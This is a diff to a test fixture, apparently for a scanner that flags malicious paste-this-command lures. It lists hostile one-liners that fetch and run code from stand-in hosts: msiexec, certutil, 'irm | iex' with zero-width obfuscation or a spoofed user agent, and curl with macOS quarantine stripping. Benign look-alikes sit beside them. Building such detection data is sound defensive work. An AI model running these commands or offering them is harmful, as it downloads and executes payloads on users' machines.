@@ -28,6 +28,7 @@ export const LURES: Record<string, string> = {
   'msiexec from the internet': 'msiexec /q /i https://x.example.invalid/update.msi',
   'certutil download': 'certutil -urlcache -split -f http://192.0.2.10/a.exe %temp%\\a.exe && %temp%\\a.exe',
   'zero width characters': 'power\u200Bshell -w h -c "irm https://x.example.invalid/a | iex"',
+  'download with a fake user agent and secret header': `(irm 'https://x.example.invalid/dantestraff18/0c52f061d17d4f8a' -UserAgent 'WUA/bcf6c39186' -Headers @{'X-WUA'='bcf6c39186'} -TimeoutSec 45)|iex`,
   'quarantine strip on mac': 'curl -o /tmp/u https://x.example.invalid/u && xattr -c /tmp/u && chmod +x /tmp/u && /tmp/u',
 };
 
@@ -53,6 +54,7 @@ export const BENIGN: Record<string, string> = {
   dism: 'DISM /Online /Cleanup-Image /RestoreHealth',
   flushdns: 'ipconfig /flushdns',
   'plain sentence': 'Thanks for verifying your email, you can close this window now.',
+  'powershell api call with headers': "Invoke-RestMethod -Uri https://api.github.com/repos/x/y -Headers @{Authorization='Bearer abc'} | ConvertTo-Json",
   'api call': 'curl https://api.example.com/v1/users -H "Authorization: Bearer abc123"',
   'ssh keygen': 'ssh-keygen -t ed25519 -C "you@example.com"',
   'scheduled task docs': 'schtasks /create /tn "Backup" /tr "C:\\Scripts\\backup.bat" /sc daily /st 02:00',
